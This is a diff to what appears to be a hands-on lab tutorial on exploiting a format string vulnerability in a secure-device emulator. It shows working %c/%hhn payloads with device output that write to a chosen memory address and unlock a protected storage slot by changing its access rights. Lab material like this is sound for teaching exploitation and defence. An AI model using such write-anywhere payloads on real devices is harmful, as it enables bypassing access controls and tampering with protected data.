@@ -127,18 +127,52 @@ Writing anywhere
 
 Would it be also possible to create a write anywhere command ? 
 Yes, with %n (which writes the number of characters printed so far to the current parameter).
->tobin.py %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p__%nAAAA | senda
+>tobin.py s %c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%8c_%hhnAAAA | senda
 < User error: Memory access error:
 < Trying to write outside mapped memory at address 0x41414141 when PC is 0x80006bc.
+(%hhn is to write a byte)
 
 We can write anywhere we want !
 
 Still, three issues make exploiting this difficult:
-1. You have a limited control over the value to write. The value is the number of bytes printed, so a very low number like zero would be impossible, and a high value like a pointer also.
-2. Where to write ? Without the binary code, you would have to poke in the dark, hoping to overwrite some interesting data. 
-3. The SD crashes after the exploit, because of a buffer overflow. So any modification you could achieve would be gone next time you restart. To go further you would need to control the buffer overflow, but if you can do that it buffer overflow would be much easier to exploit to write where you want.
+1. Where to write ? Without the binary code, you would have to poke in the dark, hoping to overwrite some interesting data. 
+2. The SD crashes after the exploit, because of a buffer overflow. So any modification you could achieve would be gone next time you restart. To go further you would need to control the buffer overflow, but if you can do that it buffer overflow would be much easier to exploit to write where you want.
 
+For 2), imagine that they is no buffer overflow. Modify the code by setting the size of the "c" buffer to 100 (in main.c receive_and_process_command function).
+Now you can write up to 104 bytes before overflowing.
 
-
-
-
+You can try to write to slot 7 access right (0x20000145)
+>tobin.py s %c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%1c_%hhn\w20000145 s w722 r7 | senda
+<ready...
+<E?P? @  @8%%%%%%%%%%%%%_E?
+<...
+<s
+<device locked
+<0  RW-L
+<1  RW-L
+<2  RW-L
+<3  R--L
+<4  R-IL
+<5  RW--
+<6  R---
+<7  ---L
+It worked, you changed slot 7 access rights to "LOCKED". It means you wrote the value 0xX8 in the slot.
+To open all other slots, you need to write 0xXF, so you can just print 7 more bytes (last %1c becomes %8c)
+>tobin.py s %c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%8c_%hhn\w20000145 w722 r7 | senda
+<...
+<device locked
+<0  RW-L
+<1  RW-L
+<2  RW-L
+<3  R--L
+<4  R-IL
+<5  RW--
+<6  R---
+<7  RWIL
+<ok
+<w722
+<ok
+<r7
+<22
+<ok
+it worked !
